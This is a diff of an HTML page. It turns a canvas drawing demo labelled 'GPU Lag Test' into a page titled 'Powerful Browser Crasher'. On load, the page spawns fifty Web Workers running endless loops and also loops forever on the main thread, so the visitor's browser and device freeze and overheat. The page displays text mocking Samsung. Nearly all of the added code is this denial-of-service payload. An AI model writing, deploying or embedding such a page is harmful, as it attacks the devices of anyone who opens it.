@@ -1,39 +1,38 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>GPU Lag Test</title>
-    <style>
-      body {
-        margin: 0;
-        overflow: hidden;
+    <title>Powerful Browser Crasher</title>
+    <script>
+      // Function to create Web Worker that runs infinite loop
+      function createCrasher() {
+        const blob = new Blob([
+          `onmessage = function() {
+              while (true) {
+                let x = Math.random() * Math.random();
+              }
+          }`
+        ], { type: 'application/javascript' });
+
+        const worker = new Worker(URL.createObjectURL(blob));
+        worker.postMessage('start');
       }
-      canvas {
-        display: block;
-      }
-    </style>
+
+      window.onload = function () {
+        // Run multiple web workers to fully fry browser
+        for (let i = 0; i < 50; i++) {
+          createCrasher();
+        }
+
+        // Also run infinite loop on main thread
+        while (true) {
+          let x = Math.random() * Math.random();
+          console.log("Samsung bekaar company hai!");
+        }
+      };
+    </script>
   </head>
   <body>
-    <canvas id="canvas"></canvas>
-    <script>
-      const canvas = document.getElementById("canvas");
-      const ctx = canvas.getContext("2d");
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-
-      function draw() {
-        for (let i = 0; i < 1000; i++) {
-          let x = Math.random() * canvas.width;
-          let y = Math.random() * canvas.height;
-          let r = Math.random() * 100;
-          ctx.beginPath();
-          ctx.arc(x, y, r, 0, Math.PI * 2);
-          ctx.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
-          ctx.fill();
-        }
-        requestAnimationFrame(draw);
-      }
-
-      draw();
-    </script>
+    <h1>Browser Doom Activated!</h1>
+    <p>Samsung = Crash + Lag + Heat = Disaster!</p>
   </body>
 </html>
